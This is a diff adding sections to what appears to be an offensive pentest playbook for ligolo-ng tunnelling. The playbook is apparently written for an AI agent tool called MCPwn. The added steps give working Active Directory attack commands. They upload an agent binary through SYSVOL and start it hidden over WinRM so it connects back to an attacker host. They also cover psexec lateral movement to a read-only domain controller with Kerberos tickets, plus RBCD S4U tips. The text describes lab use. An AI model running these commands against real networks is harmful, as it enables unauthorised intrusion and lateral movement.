@@ -62,6 +62,28 @@ listener_add --addr 0.0.0.0:4444 --to 192.168.1.5:445 --tcp
 # Now target attacker:4444 → internal 192.168.1.5:445
 ```
 
+## Version-specific notes (0.8.x)
+
+**WebUI prompt**: ligolo-ng 0.8.x prompts `Enable Ligolo-ng WebUI? (y/N)` on first run, blocking startup. This is an interactive prompt using a terminal UI library — stdin pipe/redirect may not reach it.
+
+**Workaround for headless/agent execution**:
+- After first run creates `ligolo-ng.yaml`, subsequent runs skip the prompt.
+- On first run: launch as an interactive process (`start_interactive_shell` in MCPwn) so the prompt can be answered.
+- Alternative: pre-create `ligolo-ng.yaml` in CWD with `webui: false`.
+
+**MCPwn interactive workflow**:
+```bash
+# Start as interactive shell (required for session management)
+start_interactive_shell(session_id, "ligolo-proxy -selfcert -laddr 0.0.0.0:11601")
+
+# After agent connects, send commands via send_to_shell:
+session   # shows interactive selector
+          # send Enter to select first session
+start     # activates the tunnel
+```
+
+**Critical operational note**: do NOT reset the pivot host's machine account password (e.g. `RODC01$`) before using RBCD S4U tickets through the tunnel. The pivot's local LSASS retains the old key — Kerberos service tickets encrypted with the new key fail with `STATUS_MORE_PROCESSING_REQUIRED`.
+
 ## Common Workflows
 
 ```bash
@@ -87,6 +109,36 @@ nmap -sS 10.200.1.0/24
 nxc smb 10.200.1.0/24
 evil-winrm -i 10.200.1.50 -u admin -p pass
 ```
+
+## RODC Pivot Pattern
+
+Common in AD labs: DC → RODC on an internal subnet.
+
+```bash
+# 1. Proxy on attacker
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+
+# 2. Agent on DC (has route to RODC subnet)
+# Upload via SYSVOL (writable by domain users):
+smbclient.py 'DOMAIN/user:pass@DC_IP' -c 'use SYSVOL; cd domain.local\scripts; put ligolo-agent.exe'
+# Execute via WinRM with Start-Process (survives session close):
+Start-Process -FilePath "C:\Windows\Temp\la.exe" -ArgumentList "-connect ATTACKER:11601 -ignore-cert" -WindowStyle Hidden
+
+# 3. Select session + start tunnel in proxy console
+session   # Enter to select
+start
+
+# 4. Add route
+sudo ip route add 192.168.100.0/24 dev ligolo
+
+# 5. Now reach RODC directly
+ping 192.168.100.2
+psexec.py -k -no-pass -dc-ip DC_IP -target-ip 192.168.100.2 'DOMAIN/Administrator@RODC01.domain.local'
+```
+
+**Why ligolo over chisel for Kerberos**: chisel TCP port-forwards cause Kerberos SPN validation failures (`STATUS_MORE_PROCESSING_REQUIRED`) because the client connects to 127.0.0.1 but the service ticket targets the real hostname. Ligolo's L3 TUN routing preserves the real destination IP, so Kerberos works natively.
 
 ## Double Pivot
 
